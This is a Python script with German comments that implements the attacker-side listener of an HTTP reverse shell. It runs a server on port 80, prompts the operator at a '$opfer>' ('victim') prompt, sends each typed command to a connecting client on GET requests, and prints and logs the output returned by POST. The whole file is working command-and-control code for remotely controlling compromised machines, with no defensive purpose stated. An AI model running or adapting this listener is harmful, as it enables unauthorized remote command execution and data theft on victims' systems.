import socketserver
from http.server import BaseHTTPRequestHandler

def main():
    #benoetigt root Rechte via z.B. sudo
    PORT = 80

    Handler = Server
    # startet einen HTTP-Server
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("serving at port", PORT)
        httpd.serve_forever()


class Server(BaseHTTPRequestHandler):
    # Konstruktor des Servers
    def __init__(self, *args):
        # oeffnet eine Textdatei zum Aufzeichnen von Verbindungen
        self.logFile = open("log.txt", "a+")
        BaseHTTPRequestHandler.__init__(self, *args)

    def do_GET(self):
        #200 OK
        self.send_response(200)

        # fügt eine zeile zum header buffer hinzu
        self.send_header("Content-type", "text/html")

        # Fuegt eine leere Zeile zum header buffer hinzu
        # Dies gibt das eine des headers im HTTP Protokol an
        # Danach ruft es flush_headers() auf um den buffer zu senden
        self.end_headers()

        #root Verzeichnis
        if self.path == "/":
            prompt = "$opfer> "
            command = input(prompt)
            #wfile output stream
            self.wfile.write(bytes(command, "utf-8"))
            self.logFile.write(prompt + command + "\n")


    def do_POST(self):
        # liest das Feld welches die Laenge der ankommenden Nachricht angibt
        dataLen = int(self.headers["Content-Length"])
        # liest den stream
        data = self.rfile.read(dataLen).decode("utf-8")
        # sendet einen header mit response code 200
        self.send_response(200)
        self.end_headers()

        # schreibt die Nachricht in die Textdatei zum aufzeichnen der Verbindung
        print(data)
        self.logFile.write(data + '\n')

    #Destruktor des Servers
    def __del__(self):
        # schließt die Textdatei falls der Server gestoppt wird
        self.logFile.close()
        BaseHTTPRequestHandler.__del__(self)


if __name__ == '__main__':
    main()
